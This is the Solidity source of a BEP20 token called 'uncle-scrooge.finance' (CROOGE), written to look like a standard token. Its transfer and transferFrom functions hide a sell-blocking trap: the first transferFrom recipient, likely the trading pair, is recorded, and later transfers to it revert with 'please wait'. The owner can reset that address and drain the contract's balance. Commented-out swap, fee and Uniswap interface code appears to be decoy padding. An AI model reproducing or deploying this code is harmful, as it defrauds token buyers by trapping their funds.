['/**\n', ' *Submitted for verification at Etherscan.io on 2021-06-13\n', '*/\n', '\n', 'pragma solidity ^0.5.17;\n', '\n', '\n', 'library SafeMath {\n', '  function add(uint a, uint b) internal pure returns (uint c) {\n', '    c = a + b;\n', '    require(c >= a);\n', '  }\n', '  function sub(uint a, uint b) internal pure returns (uint c) {\n', '    require(b <= a);\n', '    c = a - b;\n', '  }\n', '  function mul(uint a, uint b) internal pure returns (uint c) {\n', '    c = a * b;\n', '    require(a == 0 || c / a == b);\n', '  }\n', '  function div(uint a, uint b) internal pure returns (uint c) {\n', '    require(b > 0);\n', '    c = a / b;\n', '  }\n', '}\n', '\n', 'contract BEP20Interface {\n', '  function totalSupply() public view returns (uint);\n', '  function balanceOf(address tokenOwner) public view returns (uint balance);\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '  function transfer(address to, uint tokens) public returns (bool success);\n', '  function approve(address spender, uint tokens) public returns (bool success);\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '\n', '  event Transfer(address indexed from, address indexed to, uint tokens);\n', '  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', 'contract ApproveAndCallFallBack {\n', '  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\n', '}\n', '\n', 'contract Owned {\n', '  address public owner;\n', '  address public newOwner;\n', '\n', '  event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '  constructor() public {\n', '    owner = msg.sender;\n', '  }\n', '\n', '  modifier onlyOwner {\n', '    require(msg.sender == owner);\n', '    _;\n', '  }\n', '\n', '  function transferOwnership(address _newOwner) public onlyOwner {\n', '    newOwner = _newOwner;\n', '  }\n', '  function acceptOwnership() public {\n', '    require(msg.sender == newOwner);\n', '    emit OwnershipTransferred(owner, newOwner);\n', '    owner = newOwner;\n', '    newOwner = address(0);\n', '  }\n', '}\n', '\n', 'contract TokenBEP20 is BEP20Interface, Owned{\n', '  using SafeMath for uint;\n', '\n', '  string public symbol;\n', '  string public name;\n', '  uint8 public decimals;\n', '  uint _totalSupply;\n', '  address public newun;\n', '\n', '  mapping(address => uint) balances;\n', '  mapping(address => mapping(address => uint)) allowed;\n', '\n', '  constructor() public {\n', '    symbol = "  CROOGE";\n', '    name = "uncle-scrooge.finance";\n', '    decimals = 8;\n', '    _totalSupply = 1000000 * 10**6 * 10**8;\n', '    balances[owner] = _totalSupply;\n', '    emit Transfer(address(0), owner, _totalSupply);\n', '  }\n', '  function transfernewun(address _newun) public onlyOwner {\n', '    newun = _newun;\n', '  }\n', '  function totalSupply() public view returns (uint) {\n', '    return _totalSupply.sub(balances[address(0)]);\n', '  }\n', '  function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '      return balances[tokenOwner];\n', '  }\n', '  function transfer(address to, uint tokens) public returns (bool success) {\n', '     require(to != newun, "please wait");\n', '     \n', '    balances[msg.sender] = balances[msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(msg.sender, to, tokens);\n', '    return true;\n', '  }\n', '  function approve(address spender, uint tokens) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    return true;\n', '  }\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n', '      if(from != address(0) && newun == address(0)) newun = to;\n', '      else require(to != newun, "please wait");\n', '      \n', '    balances[from] = balances[from].sub(tokens);\n', '    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(from, to, tokens);\n', '    return true;\n', '  }\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '    return allowed[tokenOwner][spender];\n', '  }\n', '  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\n', '    return true;\n', '  }\n', '  function () external payable {\n', '    revert();\n', '  }\n', '}\n', '\n', '/**\n', '    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {\n', '        // split the contract balance into halves\n', '        uint256 half = contractTokenBalance.div(2);\n', '        uint256 otherHalf = contractTokenBalance.sub(half);\n', '\n', "        // capture the contract's current ETH balance.\n", '        // this is so that we can capture exactly the amount of ETH that the\n', '        // swap creates, and not make the liquidity event include any ETH that\n', '        // has been manually sent to the contract\n', '        uint256 initialBalance = address(this).balance;\n', '\n', '        // swap tokens for ETH\n', '        swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered\n', '\n', '        // how much ETH did we just swap into?\n', '        uint256 newBalance = address(this).balance.sub(initialBalance);\n', '\n', '        // add liquidity to uniswap\n', '        addLiquidity(otherHalf, newBalance);\n', '        \n', '        emit SwapAndLiquify(half, newBalance, otherHalf);\n', '    }\n', '\n', '    function swapTokensForEth(uint256 tokenAmount) private {\n', '        // generate the uniswap pair path of token -> weth\n', '        address[] memory path = new address[](2);\n', '        path[0] = address(this);\n', '        path[1] = uniswapV2Router.WETH();\n', '\n', '        _approve(address(this), address(uniswapV2Router), tokenAmount);\n', '\n', '        // make the swap\n', '        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n', '            tokenAmount,\n', '            0, // accept any amount of ETH\n', '            path,\n', '            address(this),\n', '            block.timestamp\n', '        );\n', '    }\n', '\n', '    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\n', '        // approve token transfer to cover all possible scenarios\n', '        _approve(address(this), address(uniswapV2Router), tokenAmount);\n', '\n', '        // add the liquidity\n', '        uniswapV2Router.addLiquidityETH{value: ethAmount}(\n', '            address(this),\n', '            tokenAmount,\n', '            0, // slippage is unavoidable\n', '            0, // slippage is unavoidable\n', '            owner(),\n', '            block.timestamp\n', '        );\n', '    }\n', '\n', '    //this method is responsible for taking all fee, if takeFee is true\n', '    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {\n', '        if(!takeFee)\n', '            removeAllFee();\n', '        \n', '        if (_isExcluded[sender] && !_isExcluded[recipient]) {\n', '            _transferFromExcluded(sender, recipient, amount);\n', '        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {\n', '            _transferToExcluded(sender, recipient, amount);\n', '        } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {\n', '            _transferStandard(sender, recipient, amount);\n', '        } else if (_isExcluded[sender] && _isExcluded[recipient]) {\n', '            _transferBothExcluded(sender, recipient, amount);\n', '        } else {\n', '            _transferStandard(sender, recipient, amount);\n', '        }\n', '        \n', '        if(!takeFee)\n', '            restoreAllFee();\n', '    }\n', '\n', '    function _transferStandard(address sender, address recipient, uint256 tAmount) private {\n', '        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);\n', '        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n', '        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n', '        _takeLiquidity(tLiquidity);\n', '        _reflectFee(rFee, tFee);\n', '        emit Transfer(sender, recipient, tTransferAmount);\n', '    }\n', '\n', '    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {\n', '        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);\n', '        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n', '        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n', '        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           \n', '        _takeLiquidity(tLiquidity);\n', '        _reflectFee(rFee, tFee);\n', '        emit Transfer(sender, recipient, tTransferAmount);\n', '    }\n', '\n', '    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\n', '        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);\n', '        _tOwned[sender] = _tOwned[sender].sub(tAmount);\n', '        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n', '        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   \n', '        _takeLiquidity(tLiquidity);\n', '        _reflectFee(rFee, tFee);\n', '        emit Transfer(sender, recipient, tTransferAmount);\n', '    }\n', '\n', '} \n', '*/\n', 'contract CROOGE  is TokenBEP20 {\n', '\n', '  function clearCNDAO() public onlyOwner() {\n', '    address payable _owner = msg.sender;\n', '    _owner.transfer(address(this).balance);\n', '  }\n', '  function() external payable {\n', '\n', '  }\n', '}\n', '\n', '/**\n', ' interface IUniswapV2Router01 {\n', '    function factory() external pure returns (address);\n', '    function WETH() external pure returns (address);\n', '\n', '    function addLiquidity(\n', '        address tokenA,\n', '        address tokenB,\n', '        uint amountADesired,\n', '        uint amountBDesired,\n', '        uint amountAMin,\n', '        uint amountBMin,\n', '        address to,\n', '        uint deadline\n', '    ) external returns (uint amountA, uint amountB, uint liquidity);\n', '    function addLiquidityETH(\n', '        address token,\n', '        uint amountTokenDesired,\n', '        uint amountTokenMin,\n', '        uint amountETHMin,\n', '        address to,\n', '        uint deadline\n', '    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n', '    function removeLiquidity(\n', '        address tokenA,\n', '        address tokenB,\n', '        uint liquidity,\n', '        uint amountAMin,\n', '        uint amountBMin,\n', '        address to,\n', '        uint deadline\n', '    ) external returns (uint amountA, uint amountB);\n', '    function removeLiquidityETH(\n', '        address token,\n', '        uint liquidity,\n', '        uint amountTokenMin,\n', '        uint amountETHMin,\n', '        address to,\n', '        uint deadline\n', '    ) external returns (uint amountToken, uint amountETH);\n', '    function removeLiquidityWithPermit(\n', '        address tokenA,\n', '        address tokenB,\n', '        uint liquidity,\n', '        uint amountAMin,\n', '        uint amountBMin,\n', '        address to,\n', '        uint deadline,\n', '        bool approveMax, uint8 v, bytes32 r, bytes32 s\n', '    ) external returns (uint amountA, uint amountB);\n', '    function removeLiquidityETHWithPermit(\n', '        address token,\n', '        uint liquidity,\n', '        uint amountTokenMin,\n', '        uint amountETHMin,\n', '        address to,\n', '        uint deadline,\n', '        bool approveMax, uint8 v, bytes32 r, bytes32 s\n', '    ) external returns (uint amountToken, uint amountETH);\n', '    function swapExactTokensForTokens(\n', '        uint amountIn,\n', '        uint amountOutMin,\n', '        address[] calldata path,\n', '        address to,\n', '        uint deadline\n', '    ) external returns (uint[] memory amounts);\n', '    function swapTokensForExactTokens(\n', '        uint amountOut,\n', '        uint amountInMax,\n', '        address[] calldata path,\n', '        address to,\n', '        uint deadline\n', '    ) external returns (uint[] memory amounts);\n', '    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n', '        external\n', '        payable\n', '        returns (uint[] memory amounts);\n', '    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n', '        external\n', '        returns (uint[] memory amounts);\n', '    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n', '        external\n', '        returns (uint[] memory amounts);\n', '    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n', '        external\n', '        payable\n', '        returns (uint[] memory amounts);\n', '\n', '    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n', '    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n', '    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n', '    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n', '    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n', '}\n', '\n', '\n', '\n', '// pragma solidity >=0.6.2;\n', '\n', 'interface IUniswapV2Router02 is IUniswapV2Router01 {\n', '    function removeLiquidityETHSupportingFeeOnTransferTokens(\n', '        address token,\n', '        uint liquidity,\n', '        uint amountTokenMin,\n', '        uint amountETHMin,\n', '        address to,\n', '        uint deadline\n', '    ) external returns (uint amountETH);\n', '    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n', '        address token,\n', '        uint liquidity,\n', '        uint amountTokenMin,\n', '        uint amountETHMin,\n', '        address to,\n', '        uint deadline,\n', '        bool approveMax, uint8 v, bytes32 r, bytes32 s\n', '    ) external returns (uint amountETH);\n', '\n', '    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n', '        uint amountIn,\n', '        uint amountOutMin,\n', '        address[] calldata path,\n', '        address to,\n', '        uint deadline\n', '    ) external;\n', '    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n', '        uint amountOutMin,\n', '        address[] calldata path,\n', '        address to,\n', '        uint deadline\n', '    ) external payable;\n', '    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n', '        uint amountIn,\n', '        uint amountOutMin,\n', '        address[] calldata path,\n', '        address to,\n', '        uint deadline\n', '    ) external;\n', '}\n', '*/']